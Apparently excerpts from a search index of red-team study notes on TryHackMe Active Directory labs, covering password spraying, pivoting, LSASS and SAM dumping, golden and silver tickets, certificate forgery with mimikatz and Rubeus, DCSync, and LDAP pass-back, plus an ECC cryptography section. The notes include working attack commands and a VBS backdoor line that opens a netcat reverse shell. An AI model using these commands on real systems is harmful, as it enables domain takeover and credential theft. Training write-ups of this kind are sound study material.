    "c": "NTLM authenticated services  New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users’ identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is used by the services on a network. And some services that use NetNTLM may also be exposed to the internet. Examples: Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal. Remote Desktop Protocol (RDP) service of a server being exposed to the internet. Exposed VPN endpoints that were integrated with AD. Web applications that are internet-facing and make use of NetNTLM. The user is now either granted access or denied access, authorisation is performed on the Exchange server with consultation of the msg.target.com Domain Controller. NTLM is generally considered insecure because it uses outdated cryptography that is vulnerable to several modes of attacks. NTLM is also vulnerable to pass-the-hash and brute-force attacks. Password spraying  Most AD environments have account lockout configured, we won’t be able to run a full brute-force attack. Instead, a password spraying attack might work. We could use tools such as Hydra to assist with the password spraying attack. The room uses a script named ntlm_passwordspray.py .

By monitoring the differences in HTTP response codes from the application, we can determine if the credential pair is valid or not.

    "t": "Port forwarding ",
    "c": "Port forwarding  SSH tunnelling  SSH, as it already has built-in functionality to do port forwarding through a feature called SSH Tunneling. While SSH used to be a protocol associated with Linux systems, Windows now ships with the OpenSSH client by default, so you can expect to find it in many systems nowadays, independent of their operating system. On Windows machines, most likely no SSH server will be available: Start a tunnel from the compromised machine, acting as an ssh client, to the attack machine, which will act as an ssh server. Making a connection back to our attacker’s machine, we will want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels. useradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser The SSH tunnel can be used to do either local or remote port forwarding. SSH remote port forwarding  Remote port forwarding is useful, for example, when having gained control over the 2.2.2.2 Windows host (it does not need to be administrator access) and would like to use it as a pivot to access a port on a server to which we can not directly connect. Take a reachable port from the SSH client (the compromised machine) and project it into a remote ssh server (the attacker's machine). To forward port 3389 on the server back to our attacker’s machine, on the compromised Windows host: C:\\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N This establishes an SSH session from 2.2.2.2 (Compromised host) to 1.1.1.1 (Attacker machine) using the tunneluser user. Because the tunneluser is not allowed to run a shell on the attacker machine, we need to run the ssh command with the -N switch to prevent the client from requesting one, or the connection will exit immediately. The -R switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the ssh server ( 3389 ), followed by a colon and then the IP and port of the socket we will be forwarding ( 3.3.3.3:3389 ). Port numbers do not need to match. When up and running, we can go to the attacker’s machine and RDP into the forwarded port to reach the server: xfreerdp /v:127.0.0.1 /u:<username> /p:<password> SSH local port forwarding  Local port forwarding allows for “pulling” a port from an ssh server into the ssh client. Any host on the network that can not connect directly to the attacker machine but can connect to the compromised host will now be able to reach the services offered on the attack machine through the pivot host. Take any service available in our attacker's machine and make it available through a port on the compromised host. To forward port 80 from the attack machine and make it available from the compromised host, run: C:\\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N The -L option requires indicating which local socket used by the compromised host to receive connections on ( *:80 ) and the remote socket to connect to from the attack machine perspective ( 127.0.0.1:80 ). Opening a new port on the compromised host, add a firewall rule to allow for incoming connections (with dir=in ). This requires administrative privileges: netsh advfirewall firewall add rule name=\"Open Port 80\" dir=in action=allow protocol=TCP localport=80 Up and running, any user pointing their browsers to the compromised host at http://2.2.2.2:80 will see the website published by the attack machine. Port forwarding with socat  socat is not as flexible as ssh , and it is more noisy, but if ssh is not available on the compromised host, may be an option. It must be transferred to the compromised host first. Access port 3389 on the server using the compromised host as a pivot, with a similar effect as SSH remote port forwarding. To access port 3389 on the server using the compromised host: C:\\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 The fork option forks a new process for each connection received, making multiple connections without closing possible. Otherwise, it would be closed after the first connection finishes. And because a port is being opened on the pivot host, create a firewall rule: netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389 The compromised host will spawn port 80 and listen for connections to be forwarded to port 80 on the attack machine. To expose port 80 from the attack machine, making it reachable by the server: C:\\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 Dynamic port forwarding and SOCKS  When wanting to run scans against many ports of a host, or even many ports across many machines through a pivot host, dynamic port forwarding seems a good choice. It allows for pivoting through a host and establishing several connections to any IP addresses/ports we want, by using a SOCKS proxy.

    "c": "Local Security Authority Subsystem Service  Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects. Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. If we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as “OS Credential Dumping: LSASS Memory (T1003)”. To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select “Create dump file”. An alternative way to dump a process if a GUI is not available to us is by using ProcDump . ProcDump is a Sysinternals process dump utility that runs from the command prompt. Mimikatz is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information and requires administrator and system privileges in order to dump memory and extract credentials.

    "c": "Persistence through SID history  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. This one is: Not easily removed except by RSAT tooling Difficult to find, not easily detected The legitimate use case of SID history is to enable access for an account to effectively be cloned to another. This becomes useful when an organisation is busy performing an AD migration as it allows users to retain access to the original domain while they are being migrated to the new one. In the new domain, the user would have a new SID, but we can add the user’s existing SID in the SID history, which will still allow them to access resources in the previous domain using their new account. While SID history is good for migrations, we, as attackers, can also abuse this feature for persistence. One way to abuse this feature is to add the SID of a privileged group – like the Domain Admins group – to the SID history of a low-level user. Even though the user is not a member of the group in AD, the system will authorise them as if they were due to the group SID being in their history. SSH into the domain controller using the given administrator credentials: ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Inspect the SID history and group membership of the unprivileged account from the credential distributor . powershell -ep bypass Get-ADUser 'user.name' -Properties sidhistory,memberof The SIDHistory property is an empty list {} and the MemberOf property shows that this user is only a member of the Internet Access group.

These ACLs determine the permissions that certain AD objects have over others. Almost any AD object can be secured with ACEs, which then describe the allowed and denied permissions that any other AD object has against the target object. Certain ACEs can be very dangerous if misconfigured: ForceChangePassword: Set a user’s password without knowing their current password.

GenericAll: Complete control over an object, including the ability to change the user’s password, register an SPN or add an AD object to the target group.

Ask Bloodhound if there is perhaps a road that we can follow to compromise this group (Add your user account as the start position and the Tier 2 Admins group as the end position). An administrator has misconfigured the Permission Delegation of the IT Support group by providing the Domain Users group with the AddMembers ACE. This means that any member of the Domain Users group (including our account) can add accounts to the IT Support Group. Furthermore, Bloodhound shows that the IT Support Group has the ForceChangePassword ACE for the Tier 2 Admins group members. This is not really a misconfiguration since Tier 2 admins are not that sensitive, but it provides a very potent attack path when combined with the initial misconfiguration.

    "t": "Exploiting kerberos delegation ",
    "c": "Exploiting kerberos delegation  The general purpose of Kerberos delegation is to allow an application or service to access a resource on another machine on behalf of a user or machine. If a user logs into an application, the application will request resources on other machines on behalf of the user. It removes the need for a global service account with less granular permissions. Unconstrained Delegation  With Unconstrained Delegation, a host has no limit on the resources it can access on behalf of a user who connects, as long as the user has the TRUSTED_FOR_DELEGATION flag set. Once a user connects, the host requests a TGT for the user and caches it locally for future use. Given the TGT, an attacker could proceed to access any resource accessible by the user owner of the TGT. For example, if an Administrator logged on to the host with unconstrained delegation, the attacker would now be in possession of the Administrator’s TGT. Constrained Delegation  Constrained Delegation restricts the type of services a service acount can request on behalf of a user. For example, if a domain service account (sevice principal) was running a web application on a web server, constrained delegation would enable the administrator to choose which services to delegate access to on behalf of another user. An administrator could selectively filter delegation to resources such as HTTP, CIFS, LDAP, HOST, MSSQL, etc. If an attacker compromised a host configured for constrained delegation and obtained the NTLM hash or password of the service account, the attacker could request a TGT for the service account and use the TGT to request a TGS for the delegate account to access a particular service. Resource-Based Constrained Delegation  This model of delegation works inversely from the other delegation types. Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This allows the service owner to control who can access it. For example, if we have permission to configure RBCD for a service, we have the ability to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with the details of an AD account that we have access to. To now gain access to the service, we can generate a TGT for the account we control, which will allow us to interact with this service.

    "c": "Local Administrator Password Solution  GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission. Once upon a time, the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on MSDN . And because Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is Get-GPPPassword . In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password. The new method includes two new attributes ( ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime ) of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd .

    "c": "Persistence through tickets  Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user. User Authentication: Deny/Allow Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on behalf of a user. When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to create this key can be DES (disabled by default on newer Windows installations), RC4 , AES218 , or AES256 , and can perhaps be extracted using mimikatz . If any of these keys are available on the host, then we can try to request a TGT as the user the Pass-the-Key way. The RC4 hash is equal to a user’s NTLM hash. If a users’ NTLM hashes were dumped from LSASS during enumeration on a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a TGT the Overpass-the-Hash way. Golden Tickets  Golden Tickets are forged TGTs. What this means is we bypass steps 1 and 2 of the diagram above, where we prove to the DC who we are. Having a valid TGT of a privileged account, we can now request a TGS for almost any service we want. In order to forge a golden ticket, we need the krbtg account’s password hash so that we can sign a TGT for any user account we want. Some interesting notes about Golden Tickets: By injecting at this stage of the Kerberos process, we don’t need the password hash of the account we want to impersonate since we bypass that step. The TGT is only used to prove that the KDC on a DC signed it. Since it was signed by the krbtg hash, this verification passes and the TGT is declared valid no matter its contents. Speaking of contents, the KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a disabled, deleted, or non-existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes. Since the policies and rules for tickets are set in the TGT itself, we could overwrite the values pushed by the KDC, such as, for example, that tickets should only be valid for 10 hours. We could, for instance, ensure that our TGT is valid for 10 years, granting us persistence. By default, the krbtg account’s password never changes, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever. The blue team would have to rotate the krbtg account’s password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services. Rotating the krbtg account’s password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won’t auto-request a new TGT. Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT. We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect. Apart from the krbtg account’s password hash, we only need the domain name, domain SID, and user ID for the person we want to impersonate. If we are in a position where we can recover the krbtg account’s password hash, we would already be in a position where we can recover the other pieces of the required information. Silver Tickets  Silver Tickets are forged TGS tickets. So now, we skip all communication (Step 1-4 in the diagram above) we would have had with the KDC on the DC and just interface with the service we want access to directly. Some interesting notes about Silver Tickets: The generated TGS is signed by the machine account of the host we are targeting. The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the krbtg account’s password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket’s scope is limited to whatever service is targeted on the specific server. Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect. Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host’s local administrators group. The machine account’s password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host’s registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine.

    "c": "Persistence through certificates  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. In Exploiting certificates , certificates were leveraged to become Domain Admins. Certificates can also be used for persistence. This attack revolves around taking the private key of the Certificate Authority (CA) of the domain. Armed with the private key, the attacker can now effectively “approve” their own Certificate Signing Requests (CSRs) and generate certificates to any user they please. In Kerberos authentication, a user can authenticate by providing their public key. SSH to the domain controller using the given domain administrator credential . Since the Active Directory Certificate Services (AD CS) services is running on the domain controller, the attack is executed on this host. ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Extract the CA’s Private Key  powershell -ep bypass Start Mimikatz: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe Enumerate certificates mimikatz # crypto::certificates /systemstore:local_machine Elevate privileges: mimikatz # privilege::debug Allow certificate export without private key: mimikatz # crypto::capi mimikatz # crypto::cng Export the certificates with private keys: mimikatz # crypto::certificates /systemstore:local_machine /export Exit: mimikatz # exit Create a certificate for the domain administrator account  List the certificate files. local_machine_My_1_za-THMDC-CA.pfx is the CA’s certificate with the private key: Get-ChildItem .\\*.pfx C:\\Tools\\ForgeCert\\ForgeCert\\ForgeCert.exe --CaCertPath .\\local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject 'CN=Pwned' --SubjectAltName 'Administrator@za.tryhackme.loc' --NewCertPath .\\domain-admin.pfx --NewCertPassword pwned123 Create the TGT using Rubeus and save it locally: C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:'.\\domain-admin.pfx' /password:'pwned123' /outfile:domain-admin.kirbi /domain:za.tryhackme.loc /dc:10.200.88.101 Use Mimikatz to inject the ticket into the session: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # kerberos::ptt domain-admin.kirbi Exit: mimikatz # exit Browse: dir \\\\thmdc.za.tryhackme.loc\\C$\\Users",

    "c": "Local Windows credentials  Keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were initially designed for legitimate purposes such as feedback for software development or parental control. And, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we can use keylogging with tools like the Metasploit framework. An example use case can be found in Exploiting AD users . Security Account Manager (SAM)  The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. It can not be read and accessed by any users while the Windows operating system is running. And there are ways and attacks to dump the content of the SAM database. The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. Another approach uses the Microsoft Volume shadow copy service , which helps perform a volume backup while applications read/write on volumes. Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some SAM database contents to be used by Windows services. Shadow Copy  Use wmic (with administrator privileges) to create a shadow volume copy: Run the standard cmd.exe prompt with administrator privileges. Execute the wmic command to create a copy shadow of C: drive Verify the creation from step 2 is available. Copy the SAM database from the volume created in step 2 Copy shadow of C: drive: C:\\Users\\Administrator>wmic shadowcopy call create Volume='C:\\' To list and confirm that we have a shadow copy of the C: volume: C:\\Users\\Administrator>vssadmin list shadows A shadow copy volume was created: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 The SAM database is encrypted either with RC4 or AES encryption algorithms. In order to decrypt it, we need the decryption key stored in c:\\Windows\\System32\\Config\\system . Copy both files (sam and system) from the shadow copy volume to the desktop, and then to the attack machine.

When a user runs the executable: A copy of the script/executable is made to a temporary directory on the user’s computer The executable is run on the user’s computer – not the server hosting the share This increases the attack surface for anyone with access to the share and executable files. Backdooring .vbs Scripts  If the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script: CreateObject(\"WScript.Shell\").Run \"cmd.exe /c copy /Y \\\\FILE-SERVER-IP\\share_name\\nc64.exe %tmp% & %tmp%\\nc64.exe -e cmd.exe <IP address attack machine> 80\", 0, True If a user runs this from the file share, the script will: Copy nc64.exe from the file server to the user’s temporary directory Give a reverse shell by executing nc64.exe and connecting to the attacker’s IP address on a specified port.

    "c": "Persistence through GPOs  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. Group Policy Management in AD provides a central mechanism to manage the local policy configuration of all domain-joined machines. This includes configuration such as membership to restricted groups, firewall and AV configuration, and which scripts should be executed upon startup. While this is an excellent tool for management, it can be targeted by attackers to deploy persistence across the entire estate. What is even worse is that the attacker can often hide the GPO in such a way that it becomes almost impossible to remove it.

This includes updated information such as the user’s new password and new objects such as when a new user is created. The process of replication is called DC Synchronisation. It is not just the DCs that can initiate replication. Accounts such as those belonging to the Domain Admins groups can also do it for legitimate purposes such as creating a new domain controller. A popular attack to perform is a DC Sync attack. With access to an account that has domain replication permissions, it is possible to stage a DC Sync attack to harvest credentials from a DC. Passwords  Passwords can easily be changed and will be changed by the blue team when an attacker is discovered. More reliable credentials would be: Local Administrative Accounts (Could still maintain a presence on multiple machines) Delegate Accounts (Given the right delegation, could generate silver or golden tickets) AD Service Credentials (WSUS, SCCM, Could force changes on the network) Order of Operations  Use your unprivileged credentials from the distributor to facilitate initial access Use the given Administrator credentials to perform privileged operations.

Recover all the usernames: cat <user.name>_dcdump.txt | grep \"SAM Username\" Recover all hashes: cat <user.name>_dcdump.txt | grep \"Hash NTLM\" One-liner  The better solution because it keeps the log files clean: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe 'lsadump::dcsync /domain:za.tryhackme.loc /all' > dcsyncall.txt Download the dcsyncall.txt file: scp administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc:C:/Users/Administrator.ZA/dcsyncall.txt .

    "c": "LDAP bind credentials  Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. And with LDAP authentication, the application directly verifies the user’s credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user’s credentials. LDAP authentication is a much used mechanism with third-party (non-Microsoft) applications that integrate with AD. Examples of applications and systems: Gitlab Jenkins Custom-developed web applications Printers VPNs If any of these applications or services are exposed on the internet, the same type of attacks as leveraged against NTLM authenticated systems can be used. And because a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. We can attempt to recover the AD credentials used by the service to gain authenticated access to AD. LDAP pass-back  A common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom. LDAP Pass-back attacks can be performed when we gain access to a device’s configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Often, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password . Test settings In this case, we can not directly extract the LDAP credentials because the password is hidden: We did find a username though. But we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials. Rogue LDAP server  install OpenLDAP: sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd Reconfigure the LDAP server to use za.tryhackme.com for the DNS domain name and Organisation: sudo dpkg-reconfigure -p low slapd Make it vulnerable by downgrading the supported authentication mechanisms.

Use the ldif file to patch the LDAP: $ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart SASL/EXTERNAL authentication started SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth SASL SSF: 0 modifying entry \"cn=config\" Check: ldapsearch -H ldap:// -x -LLL -s base -b \"\" supportedSASLMechanisms dn: supportedSASLMechanisms: PLAIN supportedSASLMechanisms: LOGIN Capturing LDAP credentials  Click the “Test Settings” at http://printer.za.tryhackme.com/settings.aspx again, the authentication will occur in clear text. If you the rogue LDAP server is configured correctly, and is downgrading the communication, you will receive the following error: “This distinguished name contains invalid syntax”. If you receive this error, you can use a tcpdump to capture the credentials: sudo tcpdump -SX -i breachad tcp port 389 Or fire up Wireshark or tshark and find the cleartext bind request password. Stop the LDAP server. sudo systemctl disable --now slapd",

Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. The most privileged groups or resources are not always the best choice, as they are often more closely watched for changes by the blue team. Exploiting permission delegation gave privileges to reset user passwords, which would be good for maintaining access to workstations.

    "c": "Credential access  Credential access is where adversaries may find credentials in compromised systems and gain access to user credentials. It helps adversaries to reuse them or impersonate the identity of a user. This is an important step for lateral movement and accessing other resources such as other applications or systems. Obtaining legitimate user credentials is preferred rather than exploiting systems using CVEs. Credentials are stored insecurely in various locations in systems: Unsecured Credentials: Credentials In Files - search a compromised machine for credentials in local or remote file systems. Clear-text files could include sensitive information created by a user, containing passwords, private keys, etc. Database files Memory Password managers Enterprise Vaults Active Directory Network Sniffing PowerShell history  As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt . It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, to look for the password keyword in the Window registry: c:\\Users\\user> reg query HKLM /f password /t REG_SZ /s OR C:\\Users\\user> reg query HKCU /f password /t REG_SZ /s Database Files  Applications use database files to read or write settings, configurations, or credentials. Database files are usually stored locally in Windows operating systems. These files are an excellent target to check and hunt for credentials. Configuration files contains a showcase example of extracting credentials from the local McAfee Endpoint database file. Password Managers  A password manager is an application to store and manage users’ login information for local and Internet websites and services. Since it deals with users’ data, it must be stored securely to prevent unauthorized access. Password Manager applications can be built-in (Windows) or third-party, like KeePass, 1Password, LastPass Misconfiguration and security flaws are found in these applications that let adversaries access stored data. Various tools can be used during the enumeration stage to get sensitive data in password manager applications used by Internet browsers and desktop applications. Memory Dump  The Operating system’s memory is a rich source of sensitive information that belongs to the Windows OS, users, and other applications. Data gets loaded into memory at run time or during the execution. Thus, accessing memory is limited to administrator users who fully control the system. The following are examples of memory stored sensitive data, including clear-text credentials, cached passwords, and AD Tickets. Active Directory  Active Directory stores a lot of information related to users, groups, computers, etc. Thus, enumerating the Active Directory environment is one of the focuses of red team assessments. Active Directory has a solid design, but misconfiguration made by admins makes it vulnerable to various attacks shown in this room. The following are some Active Directory misconfigurations that may leak users’ credentials: Users’ description: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorised access. Group Policy SYSVOL: Leaked encryption keys let attackers access administrator accounts. NTDS: Contains AD users’ credentials, making it a target for attackers. AD Attacks: Misconfiguration makes AD vulnerable to various attacks. Network Sniffing  Gaining initial access to a target network enables attackers to attack local computers, including the AD environment. The Man-In-the-Middle attack against network protocols lets the attacker create a rogue or spoof trusted resources within the network to steal authentication information such as NTLM hashes.

    "t": "Elliptic curve balls ",
    "c": "Elliptic curve balls  Elliptic Curve Cryptography (ECC) is a family of public-key cryptosystems, based on the algebraic structures of the elliptic curves over finite fields and on the difficulty of the Elliptic Curve Discrete Logarithmic Problem (ECDLP). Like RSA, ECC multiplies large numbers, but unlike RSA it does so in order to combine points on a mathematical curve, called an elliptic curve. ECC uses smaller keys and signatures than RSA for the same level of security and provides very fast key generation, fast key agreement and fast signatures. To complicate matters, there are many types of elliptic curves, efficient and inefficient ones, and secure and insecure ones. ECC crypto algorithms can use different underlying elliptic curves. Different curves provide different level of security (cryptographic strength), different performance (speed) and different key length, and also may involve different algorithms. Elliptic curves  An elliptic curve is a curve on a plane, a group of points with \\(x\\) and \\(y\\) coordinates. For example, the curve \\(y = 3\\) is a horizontal line with the vertical coordinate 3, curves of the form \\(y = ax + b\\) with fixed numbers \\(a\\) and \\(b\\) are straight lines, \\(x^2 + y^2 = 1\\) is a circle of radius \\(1\\) centered on the origin, and so on. An elliptic curve as used in cryptography is typically a curve whose equation is of the form \\(y^2 = x^3 + ax + b\\) (known as the Weierstrass form), where the constants \\(a\\) and \\(b\\) define the shape of the curve, or of the form \\(x^2 + y^2 = 1 + dx^2y^2\\) (Edwards curves). In ECC, the field is a square matrix of size \\(p x p\\) and the points on the curve are limited to integer coordinates within the field only. All algebraic operations within the field (like point addition and multiplication) result in another point within the field. ECC curves, adopted in the popular cryptographic libraries and security standards, have name (named curves, e.g. secp256k1 or Curve25519 ), field size (which defines the key length, e.g. 256-bit), security strength (usually the field size / 2 or less), performance (operations/sec) and many other parameters. ECC keys  The private keys in the ECC are integers (in the range of the curve’s field size, typically 256-bit integers). The key generation in the ECC cryptography is as simple as securely generating a random integer in certain range, so it is extremely fast. Any number within the range is valid ECC private key. The public keys in the ECC are EC points - pairs of integer coordinates \\((x, y)\\) , on the curve. Due to their special properties, EC points can be compressed to just one coordinate + 1 bit (odd or even). Thus the compressed public key, corresponding to a 256-bit ECC private key, is a 257-bit integer. ECC algorithms  Elliptic-curve cryptography (ECC) provides several groups of algorithms, based on the math of the elliptic curves over finite fields: ECC digital signature algorithms like ECDSA (for classical curves) and EdDSA (for twisted Edwards curves). ECC encryption algorithms and hybrid encryption schemes like the ECIES integrated encryption scheme and EEECC (EC-based ElGamal). ECC key agreement algorithms like ECDH, X25519 and FHMQV. ECDH  ECDH is to the ECDLP problem what DH is to DLP: it’s secure as long as ECDLP is hard. DH protocols that rely on DLP can therefore be adapted to work with elliptic curves and rely on ECDLP as a hardness assumption.

This algorithm has replaced RSA signatures and classical DSA signatures in many applications. It is, for example, the only signature algorithm used in Bitcoin and is supported by many TLS and SSH implementations. As with all signature schemes, ECDSA consists of a signature generation algorithm that the signer uses to create a signature using their private key and a verification algorithm that a verifier uses to check a signature’s correctness given the signer’s public key. The signer holds a number, \\(d\\) , as a private key, and verifiers hold the public key, \\(p = dG\\) . Both know in advance what elliptic curve to use, its order ( \\(n\\) , the number of points in the curve), and the coordinates of a base point, \\(G\\) . What can possibly go wrong?  Elliptic curves have their downsides due to their complexity and large attack surface. Their use of more parameters than classical Diffie–Hellman brings with it a greater attack surface with more opportunities for mistakes and abuse, and possible software bugs that might affect their implementation. Elliptic curve software may also be vulnerable to side-channel attacks due to the large numbers used in their arithmetic. If the speed of calculations depends on inputs, attackers may be able to obtain information about the formulas being used to encrypt. Breaking ECDH using another curve  ECDH can be elegantly broken if you fail to validate input points. The primary reason is that the formulas that give the coordinates for the sum of points \\(p + q\\) never involve the \\(b\\) coefficient of the curve; instead, they rely only on the coordinates of \\(p + q\\) and the \\(a\\) coefficient (when doubling a point). The unfortunate consequence of this is that when adding two points, you can never be sure that you’re working on the right curve because you may actually be adding points on a different curve with a different \\(b\\) coefficient. That means ECDH can be broken with the so-called invalid curve attack . ECDSA with bad randomness  ECDSA signing is randomized, as it involves a secret random number \\(k\\) when setting \\(s = (h + rd) / k \\mod n\\) . But if the same \\(k\\) is reused to sign a second message, an attacker could combine the resulting two values, \\(s_1 = (h_1 + rd) / k\\) and \\(s_2 = (h_2 + rd) / k\\) , to get \\(s_1 – s_2 = (h_1 – h_2) / k\\) and then \\(k = (h_1 – h_2) / (s_1 – s_2)\\) . When \\(k\\) is known, the private key \\(d\\) is easily recovered by computing \\((ks_1 − h_1)/r = ((h_1 + rd ) − h_1)/r = rd/r = d\\) .

